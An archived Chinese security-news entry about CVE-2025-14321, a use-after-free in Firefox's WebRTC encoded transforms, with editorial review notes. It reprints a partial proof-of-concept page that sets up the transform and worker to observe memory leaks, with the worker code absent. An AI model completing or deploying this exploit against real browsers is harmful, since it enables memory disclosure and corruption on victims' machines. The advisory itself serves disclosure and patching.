---
source: "gelusus/wxvl 公众号漏洞文库"
cve: "CVE-2025-14321"
identifier_role: "primary"
primary_identifiers: "CVE-2025-14321"
referenced_identifiers: ""
identifier_status: "unknown"
title: "漏洞利用代码公开：Firefox WebRTC 严重漏洞可导致远程代码执行 (CVSS 9.8)"
product: "Firefox RTCEncodedFrameBase/RTCRtpScriptTransform"
record_type: "advisory"
document_type: "WebRTC UAF PoC发布新闻"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "恶意网页、encoded transform和Worker API可用；具体Firefox/ESR修复版未给"
side_effects: "读取/写入原语是RCE基础，不等直接完全控制系统，缺沙箱逃逸和权限链"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/Mozilla/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E5%85%AC%E5%BC%80%EF%BC%9AFirefox%20WebRTC%20%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20%28CVSS%209.8%29.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-57087c2fed6312d197850d54"
entity_id: "ve-57087c2fed6312d197850d54"
schema_version: "1"
---

# 漏洞利用代码公开：Firefox WebRTC 严重漏洞可导致远程代码执行 (CVSS 9.8)

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Firefox RTCEncodedFrameBase/RTCRtpScriptTransform
- 文献类型：WebRTC UAF PoC发布新闻
- 版本、权限及部署边界：恶意网页、encoded transform和Worker API可用；具体Firefox/ESR修复版未给
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 页面引用poc-minimal-worker.js但未附关键worker实现，只有建连接和监听leak，不能独立触发/验证核心UAF
2. 读取/写入原语是RCE基础，不等直接完全控制系统，缺沙箱逃逸和权限链
3. 原始引用是undetached ArrayBuffer生命周期问题，正文自行加竞争条件等应标推测，非自动确认根因
4. CVSS9.8来源/向量未列；只建议最新版缺可判定范围，已有AISLE原研究链接应保留并补Mozilla公告
5. AI自主发现贡献为研究团队主张，新闻不要求补造完整RCE

### 操作风险

读取/写入原语是RCE基础，不等直接完全控制系统，缺沙箱逃逸和权限链

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://aisle.com/blog/firefox-webrtc-encoded-transforms-uaf-via-undetached-arraybuffer-cve-2025-14321>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

sec随谈
                    sec随谈  sec随谈   2026-01-27 00:40  
  
Mozilla Firefox 中发现了一个严重漏洞，安全研究人员公开了该漏洞的技术细节和概念验证 (PoC) 利用代码，该漏洞可能允许攻击者在受害者机器上执行任意代码。   
  
该漏洞编号为 CVE-2025-14321，CVSS 严重性评分最高为 9.8。该漏洞由 AISLE 研究团队发现，存在于 Firefox 的 WebRTC API 中，具体来说，存在于用于操作音频和视频流的“编码转换”机制中。   
  
这一发现凸显了人工智能在漏洞研究中日益重要的作用。 AISLE团队将这一问题归功于他们开发的“基于人工智能的源代码分析器”，该分析器能够自主识别问题，而问题源于一个复杂的释放后使用（UAF）漏洞。   
  
“编码转换”功能允许 Web 应用程序使用 RTCRtpScriptTransform API 修改媒体帧（用于端到端加密或水印等任务）。此 API 将内部数据以 ArrayBuffer 的形式暴露给 JavaScript。   
  
然而，研究人员发现内存管理存在致命缺陷。报告解释说：“就像普通的 ArrayBuffer 一样，生命周期检查需要确保后端存储（API 背后的存储）在浏览器中对网站的引用可用时始终保持存活。 ”   
  
该漏洞的出现是因为浏览器未能正确处理“分离”操作。在 JavaScript 中，ArrayBuffer 可以被“分离”（转移）到 Web Worker 中，导致原始引用为空。但在这个特定的实现中，研究人员找到了一种方法来欺骗系统。   
  
公开披露的内容包括漏洞利用方式的详细说明，实际上为潜在攻击者提供了一份蓝图。   
  
问题的核心在于“通过未分离的数组缓冲区实现的UAF”。攻击者可以通过制造竞争条件或操纵数据流的传输，维持对本应被释放或转移的内存的访问权限。这为攻击者提供了两项关键能力：   
  
1、信息泄露：从内存中读取敏感数据的能力。   
  
2、堆损坏：能够将数据写入内存，从而实现对系统的完全控制。   
  
“AISLE 研究团队发现了一个释放后使用 (UAF) 漏洞……该漏洞可被利用来构成远程代码执行漏洞的基础，方法是提供堆损坏原语（写入）和信息泄露原语（读取）”。   
  
研究人员提供了一段 JavaScript 代码片段来演示这种攻击，该代码片段使用 RTCRtpScriptTransform 和 Web Worker 来触发泄漏。   
  
已发布的代码详细展示了如何设置收发器、创建工作进程以及监听“泄漏”消息：  
```
<!doctype html>
<meta charset="utf-8">
<title>Minimal PoC: RTCEncodedFrameBase UAF</title>
<script>
(async () => {
  const canvas = document.createElement('canvas');
  canvas.width = 320; canvas.height = 180;
  const ctx = canvas.getContext('2d');
  let t = 0;
  function draw() {
    t++;
    ctx.fillStyle = `hsl(${t % 360}, 80%, 50%)`;
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    requestAnimationFrame(draw);
  }
  draw();
  const track = canvas.captureStream(30).getVideoTracks()[0];

  const pc1 = new RTCPeerConnection();
  const pc2 = new RTCPeerConnection();
  const sender = pc1.addTransceiver(track);

  const worker = new Worker('poc-minimal-worker.js');
  const transform = new RTCRtpScriptTransform(worker, { role: 'receiver' });
  sender.sender.transform = new RTCRtpScriptTransform(worker, { role: 'sender' });

  pc2.ontrack = (ev) => ev.receiver.transform = transform;

  pc1.onicecandidate = e => e.candidate && pc2.addIceCandidate(e.candidate);
  pc2.onicecandidate = e => e.candidate && pc1.addIceCandidate(e.candidate);

  const offer = await pc1.createOffer();
  await pc1.setLocalDescription(offer);
  await pc2.setRemoteDescription(offer);
  const answer = await pc2.createAnswer();
  await pc2.setLocalDescription(answer);
  await pc1.setRemoteDescription(answer);

  worker.onmessage = (e) => {
    const d = e.data;
    if (d.type === 'leak') {
      console.log(`[leak ${d.idx}] size=${d.size} first16=${d.hex}`);
    } else if (d.type === 'change') {
      console.log(`[leak ${d.idx}] CHANGED: ${d.hex}`);
    }
  };
})();
</script>

```  
  
这种程度的细节大大降低了威胁行为者利用该漏洞的门槛。   
  
Mozilla 已在其最新版本中修复了该漏洞。修复方案包括强制执行更严格的检查，以确保内存能够在应该分离时正确分离。   
  
报告指出：“修复方案在概念上很简单：让分离操作不可避免。该补丁引入了 DetachData() 辅助函数，并在所有清理路径中调用它。”   
  
由于攻击蓝图已经公开，用户被敦促立即更新其 Firefox 浏览器，以防止潜在的远程代码执行攻击。  
  
参考链接：  
  
https://aisle.com/blog/firefox-webrtc-encoded-transforms-uaf-via-undetached-arraybuffer-cve-2025-14321  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原始披露 URL 尚未确认，现有链接按来源追溯区分别标注）
